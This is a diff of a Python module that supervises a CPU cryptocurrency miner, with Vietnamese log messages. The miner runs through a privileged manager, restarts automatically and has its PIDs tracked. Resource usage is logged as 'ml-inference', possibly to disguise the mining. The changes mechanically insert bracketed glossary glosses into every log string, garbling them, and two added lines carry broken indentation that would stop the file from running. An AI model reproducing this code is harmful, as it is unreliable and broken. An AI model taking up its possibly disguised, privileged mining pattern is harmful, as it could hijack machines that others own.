-                    logger.warning(f"CPU miner khởi động thất bại, thử lại... ({retries}/{max_retries})")
+                    cpu_miner_logger.warning(f"❌ Khởi động **[CPU]** (bộ xử lý trung tâm) miner thất bại - thử lại {retries}/{max_retries}")
+                    logger.warning(f"**[CPU]** (bộ xử lý trung tâm) miner khởi động thất bại, thử lại... ({retries}/{max_retries})")
                 else:
-                    cpu_miner_logger.info(f"✅ CPU miner đã khởi động thành công - PID: {cpu_process.pid if cpu_process else 'Unknown'}")
-                    logger.info("✅ CPU miner đã khởi động thành công.")
+                    cpu_miner_logger.info(f"✅ **[CPU]** (bộ xử lý trung tâm) miner đã khởi động thành công - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid if cpu_process else 'Unknown'}")
+                    logger.info("✅ **[CPU]** (bộ xử lý trung tâm) miner đã khởi động thành công.")
                     retries = 0  # Reset retries on successful start
             else:
                 # **Process running - log status** (tiến trình đang chạy - ghi log trạng thái)
                 retries = 0
-                cpu_miner_logger.debug(f"📊 CPU miner đang chạy ổn định - PID: {cpu_process.pid if cpu_process else 'Unknown'}")
+                cpu_miner_logger.debug(f"📊 **[CPU]** (bộ xử lý trung tâm) miner đang chạy ổn định - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid if cpu_process else 'Unknown'}")
                 
                 # **Log resource usage** (ghi log mức sử dụng tài nguyên)
                 log_resource_usage("ml-inference")
@@ -776,15 +775,15 @@ def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
         stop_event.wait(30)
     
     if retries >= max_retries:
-        cpu_miner_logger.error(f"🚨 CPU miner thất bại {max_retries} lần - dừng giám sát")
-        logger.error("🚨 CPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
+        cpu_miner_logger.error(f"🚨 **[CPU]** (bộ xử lý trung tâm) miner thất bại {max_retries} lần - dừng giám sát")
+        logger.error("🚨 **[CPU]** (bộ xử lý trung tâm) miner đã thất bại quá nhiều lần. Dừng giám sát.")
         stop_event.set()
     
-    cpu_miner_logger.info("===== KẾT THÚC VÒNG ĐỜI [CPU Miner] (tiến trình khai thác CPU) =====")
+    cpu_miner_logger.info("===== KẾT THÚC VÒNG ĐỜI [**[CPU]** (bộ xử lý trung tâm) Miner] (tiến trình khai thác **[CPU]** (bộ xử lý trung tâm)) =====")
 
 def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
     """(ĐÃ GỠ) Quản lý GPU miner không còn trong bản CPU-only."""
-    logger.info("manage_gpu_miner() đã bị loại bỏ trong bản chỉ CPU (CPU-only)")
+    logger.info("manage_gpu_miner() đã bị loại bỏ trong bản chỉ **[CPU]** (bộ xử lý trung tâm) (**[CPU]** (bộ xử lý trung tâm)-only)")
     return
 
 # **Global Thread Communication Event Bus** (EventBus giao tiếp luồng toàn cầu)
@@ -798,7 +797,7 @@ def get_thread_event_bus():
         if event_bus_instance is None:
             from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
             event_bus_instance = EventBus(backend_type="memory", logger=logger)
-            logger.info("✅ Thread EventBus initialized successfully")
+            logger.info("✅ **[thread]** (luồng) EventBus initialized successfully")
         return event_bus_instance
 
 def environment_setup_thread():
@@ -842,7 +841,7 @@ def cpu_mining_thread():
     global cpu_process
     # 🔧 FIX: Sử dụng cpu_miner_logger thay vì tạo thread_logger riêng
     thread_logger = cpu_miner_logger
-    thread_logger.info("⚡ Luồng Khai thác CPU đã bắt đầu")
+    thread_logger.info("⚡ Luồng Khai thác **[CPU]** (bộ xử lý trung tâm) đã bắt đầu")
     
     bus = get_thread_event_bus()
     max_retries = 5
@@ -852,7 +851,7 @@ def cpu_mining_thread():
     global privileged_manager_global
     privileged_manager = privileged_manager_global
     if privileged_manager is None:
-        thread_logger.error("❌ Environment chưa sẵn sàng - dừng CPU mining thread")
+        thread_logger.error("❌ **[environment]** (môi trường) chưa sẵn sàng - dừng **[CPU]** (bộ xử lý trung tâm) mining **[thread]** (luồng)")
         stop_event.set()
         return
     
@@ -861,21 +860,21 @@ def cpu_mining_thread():
         try:
             with process_lock:
                 running_status = is_mining_process_running(cpu_process)
-                thread_logger.debug(f"[TRACE] is_mining_process_running={running_status}, PID={getattr(cpu_process,'pid',None)}")
+                thread_logger.debug(f"[TRACE] is_mining_process_running={running_status}, **[PID]** (Process ID - mã định danh tiến trình)={getattr(cpu_process,'pid',None)}")
                 if not running_status:
-                    thread_logger.info(f"🔄 Đang khởi động tiến trình khai thác CPU (lần {retries + 1}/{max_retries})")
+                    thread_logger.info(f"🔄 Đang khởi động tiến trình khai thác **[CPU]** (bộ xử lý trung tâm) (lần {retries + 1}/{max_retries})")
                     cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_manager)
-                    thread_logger.info(f"🔍 [DEBUG] start_mining_process trả về: {cpu_process} (kiểu: {type(cpu_process)})")
+                    thread_logger.info(f"🔍 [**[debug]** (gỡ lỗi)] start_mining_process trả về: {cpu_process} (kiểu: {type(cpu_process)})")
                     if cpu_process:
-                        thread_logger.info(f"🔍 [DEBUG] Nhận tiến trình CPU thành công - PID: {cpu_process.pid}")
+                        thread_logger.info(f"🔍 [**[debug]** (gỡ lỗi)] Nhận tiến trình **[CPU]** (bộ xử lý trung tâm) thành công - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid}")
                         # Enhanced PID Logger: register_process đã được gọi trong start_mining_process
-                        thread_logger.info(f"✅ PID tiến trình CPU {cpu_process.pid} đã được đăng ký cho giám sát nâng cao")
+                        thread_logger.info(f"✅ **[PID]** (Process ID - mã định danh tiến trình) tiến trình **[CPU]** (bộ xử lý trung tâm) {cpu_process.pid} đã được đăng ký cho giám sát nâng cao")
                     else:
-                        thread_logger.error(f"🔍 [DEBUG] CPU process is None - start_mining_process failed")
+                        thread_logger.error(f"🔍 [**[debug]** (gỡ lỗi)] **[CPU]** (bộ xử lý trung tâm) **[process]** (tiến trình) is **[none]** (không có) - start_mining_process failed")
                     
                     if cpu_process:
                         # **EventBus PID registration** (đăng ký PID EventBus) – publish ngay, không phụ thuộc kiểm tra running**
-                        thread_logger.info(f"🔍 [DIAGNOSTIC] Sắp publish cpu_pid_registered cho PID {cpu_process.pid}")
+                        thread_logger.info(f"🔍 [DIAGNOSTIC] Sắp publish cpu_pid_registered cho **[PID]** (Process ID - mã định danh tiến trình) {cpu_process.pid}")
                         try:
                             event_payload = {
                                 'thread_id': threading.current_thread().ident,
@@ -886,7 +885,7 @@ def cpu_mining_thread():
                                 'attempt': retries + 1,
                                 'timestamp': time.time()
                             }
-                            thread_logger.info(f"🔍 [DIAGNOSTIC] [Event payload] (tải sự kiện): {event_payload}")
+                            thread_logger.info(f"🔍 [DIAGNOSTIC] [**[event]** (sự kiện) payload] (tải sự kiện): {event_payload}")
                             bus.publish('mining:cpu_pid_registered', event_payload)
                             thread_logger.info(f"✅ [DIAGNOSTIC] Đã publish sự kiện cpu_pid_registered thành công")
                         except Exception as e:
@@ -903,39 +902,39 @@ def cpu_mining_thread():
                                 name=f"CPUMonitor-{cpu_process.pid}"
                             )
                             monitor_thread.start()
-                            thread_logger.info(f"📊 Đã khởi chạy luồng giám sát output CPU (ID: {monitor_thread.ident})")
+                            thread_logger.info(f"📊 Đã khởi chạy luồng giám sát output **[CPU]** (bộ xử lý trung tâm) (ID: {monitor_thread.ident})")
                         except Exception as monitor_err:
-                            thread_logger.error(f"❌ Khởi chạy giám sát output CPU thất bại: {monitor_err}")
+                            thread_logger.error(f"❌ Khởi chạy giám sát output **[CPU]** (bộ xử lý trung tâm) thất bại: {monitor_err}")
                         
-                        thread_logger.info(f"✅ Khai thác CPU đã bắt đầu - PID: {cpu_process.pid}")
+                        thread_logger.info(f"✅ Khai thác **[CPU]** (bộ xử lý trung tâm) đã bắt đầu - **[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid}")
                         retries = 0  # Reset on success
                     else:
                         retries += 1
-                        thread_logger.error(f"❌ Khởi động khai thác CPU thất bại (lần {retries}/{max_retries})")
+                        thread_logger.error(f"❌ Khởi động khai thác **[CPU]** (bộ xử lý trung tâm) thất bại (lần {retries}/{max_retries})")
                 else:
                     # **Process running - periodic PID update** (tiến trình đang chạy - cập nhật PID định kỳ)
                     # bỏ heartbeat qua EventBus – chỉ ghi log nội bộ
-                    thread_logger.debug("CPU miner nhịp tim ổn định (healthy heartbeat)")
+                    thread_logger.debug("**[CPU]** (bộ xử lý trung tâm) miner nhịp tim ổn định (healthy heartbeat)")
                     
         except Exception as e:
-            thread_logger.error(f"❌ Lỗi Luồng Khai thác CPU: {e}")
+            thread_logger.error(f"❌ Lỗi Luồng Khai thác **[CPU]** (bộ xử lý trung tâm): {e}")
             retries += 1
         
         # **Supervision interval** (khoảng thời gian giám sát)
         stop_event.wait(30)
     
     if retries >= max_retries:
-    thread_logger.error(f"🚨 Khai thác CPU thất bại {max_retries} lần - dừng luồng")
+    thread_logger.error(f"🚨 Khai thác **[CPU]** (bộ xử lý trung tâm) thất bại {max_retries} lần - dừng luồng")
         stop_event.set()
     
-    thread_logger.info("🔚 Luồng Khai thác CPU đã kết thúc")
+    thread_logger.info("🔚 Luồng Khai thác **[CPU]** (bộ xử lý trung tâm) đã kết thúc")
 
 def gpu_mining_thread():
     """
     (ĐÃ GỠ) GPU mining thread đã được loại bỏ trong bản CPU-only.
     Giữ placeholder để tương thích import cũ nếu có, nhưng không thực thi.
     """
-    logger.info("Luồng khai thác GPU đã bị loại bỏ trong bản chỉ CPU (CPU-only).")
+    logger.info("Luồng khai thác **[GPU]** (bộ xử lý đồ họa) đã bị loại bỏ trong bản chỉ **[CPU]** (bộ xử lý trung tâm) (**[CPU]** (bộ xử lý trung tâm)-only).")
     return
 
 def resource_manager_thread():
@@ -1013,24 +1012,24 @@ def main():
         # Verify worker đã khởi chạy thành công
         for i in range(5):  # Retry 5 lần, mỗi lần 0.5s
             if _WORKER_STARTED.is_set():
-                logger.info("🚀 Worker PID Logger đã khởi động thành công")
+                logger.info("🚀 Worker **[PID]** (Process ID - mã định danh tiến trình) Logger đã khởi động thành công")
                 break
             time.sleep(0.5)
-                logger.info(f"⏳ Đang chờ worker PID Logger khởi động... (lần {i+1}/5)")
+                logger.info(f"⏳ Đang chờ worker **[PID]** (Process ID - mã định danh tiến trình) Logger khởi động... (lần {i+1}/5)")
         else:
-            logger.error("❌ Worker PID Logger khởi động thất bại sau 5 lần thử")
+            logger.error("❌ Worker **[PID]** (Process ID - mã định danh tiến trình) Logger khởi động thất bại sau 5 lần thử")
             # Force restart worker
             from pid_logger import force_restart_worker
             force_restart_worker()
-            logger.info("🔄 Đã khởi động lại cưỡng bức worker PID Logger")
+            logger.info("🔄 Đã khởi động lại cưỡng bức worker **[PID]** (Process ID - mã định danh tiến trình) Logger")
     except Exception as e:
-        logger.error(f"❌ Khởi động worker PID Logger thất bại: {e}")
+        logger.error(f"❌ Khởi động worker **[PID]** (Process ID - mã định danh tiến trình) Logger thất bại: {e}")
         # Fallback: try to start worker again
         try:
             start_worker()
-            logger.info("🔄 Worker PID Logger (dự phòng) đã khởi động")
+            logger.info("🔄 Worker **[PID]** (Process ID - mã định danh tiến trình) Logger (dự phòng) đã khởi động")
         except Exception as e2:
-            logger.error(f"❌ Worker PID Logger (dự phòng) cũng thất bại: {e2}")
+            logger.error(f"❌ Worker **[PID]** (Process ID - mã định danh tiến trình) Logger (dự phòng) cũng thất bại: {e2}")
 
     # 🤖 Auto PID Registration Thread để theo dõi và đăng ký tiến trình mining
     def auto_pid_registration_thread():
@@ -1040,7 +1039,7 @@ def main():
         import os
         from pid_logger import register_process, _PROCESS_REGISTRY, debug_registry_status
         
-        logger.info("🤖 Luồng Đăng ký PID Tự động đã bắt đầu")
+        logger.info("🤖 Luồng Đăng ký **[PID]** (Process ID - mã định danh tiến trình) Tự động đã bắt đầu")
         last_scan_pids = set()
         
         while True:
@@ -1072,20 +1071,20 @@ def main():
                             real_proc = psutil.Process(pid)
                             
                             register_process(pid, process_type, real_proc, process_name)
-                            logger.info(f"🤖 Đã tự động đăng ký PID khai thác {process_type} mới: {pid} với đối tượng tiến trình psutil thực")
+                            logger.info(f"🤖 Đã tự động đăng ký **[PID]** (Process ID - mã định danh tiến trình) khai thác {process_type} mới: {pid} với đối tượng tiến trình psutil thực")
                         except psutil.NoSuchProcess:
-                            logger.warning(f"🤖 PID tiến trình {pid} không còn tồn tại trong lúc đăng ký")
+                            logger.warning(f"🤖 **[PID]** (Process ID - mã định danh tiến trình) tiến trình {pid} không còn tồn tại trong lúc đăng ký")
                         except psutil.AccessDenied:
-                            logger.warning(f"🤖 Bị từ chối quyền với PID {pid}, dùng tiến trình giả dự phòng")
+                            logger.warning(f"🤖 Bị từ chối quyền với **[PID]** (Process ID - mã định danh tiến trình) {pid}, dùng tiến trình giả dự phòng")
                             # Fallback to fake process if access denied
                             fake_proc = type('FakeProcess', (), {
                                 'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
                                 'is_running': lambda: os.path.exists(f"/proc/{pid}")
                             })()
                             register_process(pid, process_type, fake_proc, process_name)
-                            logger.info(f"🤖 Đã tự động đăng ký PID khai thác {process_type}: {pid} với tiến trình giả dự phòng")
+                            logger.info(f"🤖 Đã tự động đăng ký **[PID]** (Process ID - mã định danh tiến trình) khai thác {process_type}: {pid} với tiến trình giả dự phòng")
                         except Exception as e:
-                            logger.warning(f"🤖 Đăng ký tự động thất bại cho PID {pid}: {e}")
+                            logger.warning(f"🤖 Đăng ký tự động thất bại cho **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
                 
                 last_scan_pids = current_pids
                 
@@ -1096,7 +1095,7 @@ def main():
                 time_module.sleep(5)  # Scan mỗi 5 giây
                 
             except Exception as e:
-                logger.error(f"🤖 Lỗi Luồng Đăng ký PID Tự động: {e}")
+                logger.error(f"🤖 Lỗi Luồng Đăng ký **[PID]** (Process ID - mã định danh tiến trình) Tự động: {e}")
                 time_module.sleep(10)  # Sleep dài hơn khi có lỗi
     
     # Thêm khai báo danh sách mining_threads
@@ -1160,7 +1159,7 @@ def main():
 
     def cpu_pid_handler(payload):
         thread_status['cpu_pid_registered'] = True
-        logger.info(f"✅ CPU Mining PID registered: {payload['pid']}")
+        logger.info(f"✅ **[CPU]** (bộ xử lý trung tâm) Mining **[PID]** (Process ID - mã định danh tiến trình) registered: {payload['pid']}")
     
     # **Subscribe to thread events** (đăng ký sự kiện luồng)
     # chỉ dùng EventBus cho PID
@@ -1300,7 +1299,7 @@ def main():
         stop_event.set()
     
     # **Thread cleanup and synchronization** (dọn dẹp và đồng bộ hóa luồng)
-    logger.info("🧹 Starting thread cleanup and synchronization...")
+    logger.info("🧹 Starting **[thread]** (luồng) cleanup and synchronization...")
     
     # **EventBus shutdown notification** (thông báo tắt EventBus)
     bus.publish('system:shutdown_initiated', {
@@ -1374,16 +1373,16 @@ def main():
     with process_lock:
         # **Terminate CPU process** (kết thúc tiến trình CPU)
         if cpu_process and cpu_process.poll() is None:
-            logger.info(f"Dừng tiến trình CPU miner (PID: {cpu_process.pid})...")
+            logger.info(f"Dừng tiến trình **[CPU]** (bộ xử lý trung tâm) miner (**[PID]** (Process ID - mã định danh tiến trình): {cpu_process.pid})...")
             try:
                 cpu_process.terminate()
                 cpu_process.wait(timeout=5)  # Wait for graceful termination
-                logger.info("✅ Tiến trình CPU đã dừng êm")
+                logger.info("✅ Tiến trình **[CPU]** (bộ xử lý trung tâm) đã dừng êm")
             except subprocess.TimeoutExpired:
-                logger.warning("⚠️ Tiến trình CPU không dừng êm, buộc hủy (kill)")
+                logger.warning("⚠️ Tiến trình **[CPU]** (bộ xử lý trung tâm) không dừng êm, buộc hủy (kill)")
                 cpu_process.kill()
             except Exception as e:
-                logger.error(f"❌ Lỗi khi kết thúc tiến trình CPU: {e}")
+                logger.error(f"❌ Lỗi khi kết thúc tiến trình **[CPU]** (bộ xử lý trung tâm): {e}")
         
         # (CPU-only) Không còn tiến trình GPU để kết thúc
     
